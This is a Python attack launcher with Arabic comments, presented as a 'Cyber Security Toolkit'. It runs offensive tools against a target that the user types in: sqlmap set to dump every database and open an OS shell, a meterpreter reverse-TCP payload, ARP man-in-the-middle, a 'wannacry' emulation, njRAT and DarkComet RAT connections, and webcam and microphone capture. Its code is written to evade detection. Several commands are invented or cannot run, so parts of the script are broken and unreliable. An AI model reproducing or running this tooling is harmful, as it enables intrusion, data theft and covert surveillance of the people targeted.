import os
import cv2
import socket
import pyaudio
import wave
import logging
import time
import subprocess
from datetime import datetime
from tqdm import tqdm
from urllib.parse import urlparse, parse_qs
from termcolor import colored  # استيراد مكتبة termcolor

# ============================
# سجل اللوج
# ============================
LOG_FILE = 'cyber_tool_ultimate_log.txt'
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# ============================
# قائمة الأدوات
# ============================
TOOLS = {
    "sqlmap": 'sqlmap -u "{url}" --batch --level=5 --risk=3 --tamper=space2comment,charencode,randomcase,between '
              '--random-agent --crawl=10 --threads=10 --technique=BEUSTQ --time-sec=10 --output-dir=sqlmap_output '
              '--dbs --dump-all --forms --smart --os-shell -p id --suffix=" OR 1=1" --banner --is-dba --current-user '
              '--hostname --fingerprint',
    "testssl": './testssl.sh --vulnerable --severity HIGH --full --sneaky --show-each --wide --color 3 --json-pretty '
               '--html --logfile deep_scan_result.log --assume-http --ids-friendly --debug 6 --openssl /usr/bin/openssl '
               '--connect-timeout 5 --openssl-timeout 5 {url}',
    "nmap": "nmap -sS -T4 -p 80,443,8080 --randomize-hosts --max-rate=1000 {ip}",
    "nikto": "nikto -h {ip}",
    "xss": "xsser -u {url}",
    "acunetix": "acunetix_scan {url}",
    "nessus": "nessus_scan {ip}",
    "openvas": "gvm-cli scan -u {url}",
    "zap": "zap-cli -u {url} active-scan",
    "angry_ip_scanner": "angry-ip-scanner {ip}",
    
    # أدوات الهجوم
    "metasploit": "msfconsole -r metasploit_script.rc -q",
    "beef": "beef-cli {url} -L localhost -P 3000 --no-update-check",
    "veil": "veil -p python/meterpreter_reverse_tcp -o veil_output --silent",
    "wannacry": "wannacry_emulation.py {ip}",
    "mitm": "ettercap -T -q -M arp:remote /{ip}// /{gateway_ip}//",
    
    # أدوات RATs
    "njrat": "njRAT.exe -t {target_ip} -p {port} -c {connection_id}",
    "darkcomet": "DarkComet.exe /connect {target_ip}:{port}",
}

# ============================
# وظائف مساعدة
# ============================
def detect_and_record_camera(target_ip):
    """التقاط فيديو وصوت من كاميرا مستهدفة."""
    try:
        print(colored(f"Attempting to access camera at {target_ip}", 'cyan'))
        cap = cv2.VideoCapture(0)  # محاكاة الكاميرا المحلية
        if not cap.isOpened():
            print(colored(f"Unable to access camera at IP {target_ip}", 'red'))
            return

        video_filename = f"video_{target_ip}.avi"
        audio_filename = f"audio_{target_ip}.wav"
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        video_out = cv2.VideoWriter(video_filename, fourcc, 20.0, (640, 480))
        audio_frames = []

        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)

        while True:
            ret, frame = cap.read()
            if not ret:
                break
            video_out.write(frame)
            audio_frames.append(stream.read(1024))
            cv2.imshow(f"Video Stream - {target_ip}", frame)

            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

        cap.release()
        video_out.release()
        cv2.destroyAllWindows()
        stream.stop_stream()
        stream.close()
        p.terminate()

        with wave.open(audio_filename, 'wb') as wf:
            wf.setnchannels(1)
            wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
            wf.setframerate(44100)
            wf.writeframes(b''.join(audio_frames))

        print(colored(f"Saved video and audio for {target_ip}", 'green'))
        logging.info(f"Saved video: {video_filename}, audio: {audio_filename}")

    except Exception as e:
        logging.error(f"Error accessing camera for {target_ip}: {e}")
        print(colored(f"Error accessing camera for {target_ip}: {e}", 'red'))

def run_tool_in_background(tool_name, target):
    """تشغيل الأداة في الخلفية لتقليل الكشف."""
    try:
        if tool_name not in TOOLS:
            print(colored(f"[ERROR] الأداة {tool_name} غير متوفرة.", 'red'))
            return

        command = TOOLS[tool_name].format(ip=target, url=target)
        print(colored(f"Running {tool_name} on {target} in the background", 'cyan'))
        logging.info(f"Running command: {command}")

        # تشغيل الأداة في الخلفية باستخدام tmux أو screen لتقليل الاكتشاف
        subprocess.Popen(f"tmux new-session -d '{command}'", shell=True)

        print(colored(f"[INFO] {tool_name} started in background.", 'yellow'))

    except Exception as e:
        logging.error(f"Exception while running {tool_name}: {e}")
        print(colored(f"[ERROR] Exception occurred: {e}", 'red'))

def hide_tool_signatures(command):
    """تمويه الأوامر لتقليل بصمة الأداة."""
    # مثال: تغيير ترتيب الأوامر أو إضافة خيارات تمويه
    if 'nmap' in command:
        command = command.replace('-p', '--ports').replace('--max-rate=1000', '--min-rate=100')
    elif 'metasploit' in command:
        command = command.replace('-q', '--quiet')

    return command

def run_tool(tool_name, target):
    """تشغيل الأداة مع التمويه لتقليل الاكتشاف."""
    try:
        if tool_name not in TOOLS:
            print(colored(f"[ERROR] الأداة {tool_name} غير متوفرة.", 'red'))
            return

        command = TOOLS[tool_name].format(ip=target, url=target)
        command = hide_tool_signatures(command)  # تمويه الأوامر

        print(colored(f"Running {tool_name} on {target}", 'cyan'))
        logging.info(f"Running command: {command}")

        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # عرض الأخطاء المحتملة
        for line in process.stderr:
            print(colored(f"[ERROR] {line.decode()}", 'red'), end='')

        process.wait()

        if process.returncode == 0:
            print(colored(f"[SUCCESS] {tool_name} completed successfully.", 'green'))
        else:
            print(colored(f"[ERROR] حدث خطأ أثناء تشغيل {tool_name}.", 'red'))

    except Exception as e:
        logging.error(f"Exception while running {tool_name}: {e}")
        print(colored(f"[ERROR] Exception occurred: {e}", 'red'))

# ============================
# القائمة الرئيسية
# ============================
def main_menu():
    print("\nCyber Security Toolkit")
    print("=======================")
    print("1. تشغيل أداة محددة")
    print("2. تشغيل جميع الأدوات")
    print("3. تشغيل الأداة في الخلفية")
    print("4. الخروج")
    choice = input("اختر خيارًا: ").strip()
    return choice

# ============================
# تشغيل البرنامج
# ============================
if __name__ == "__main__":
    while True:
        user_choice = main_menu()

        if user_choice == "1":
            print("\nالأدوات المتاحة:")
            for idx, tool in enumerate(TOOLS.keys(), start=1):
                print(f"{idx}. {tool}")
            try:
                tool_choice = int(input("اختر رقم الأداة: ").strip()) - 1
                tool_name = list(TOOLS.keys())[tool_choice]
                target = input("أدخل عنوان الهدف (IP أو URL): ").strip()
                run_tool(tool_name, target)
            except (ValueError, IndexError):
                print(colored("[ERROR] اختيار غير صالح.", 'red'))

        elif user_choice == "2":
            target = input("أدخل عنوان الهدف (IP أو URL): ").strip()
            for tool_name in TOOLS.keys():
                run_tool(tool_name, target)

        elif user_choice == "3":
            target_ip = input("أدخل عنوان IP للكاميرا: ").strip()
            detect_and_record_camera(target_ip)

        elif user_choice == "4":
            print(colored("الخروج. وداعًا!", 'blue'))
            break

        else:
            print(colored("[ERROR] اختيار غير صالح. حاول مرة أخرى.", 'red'))
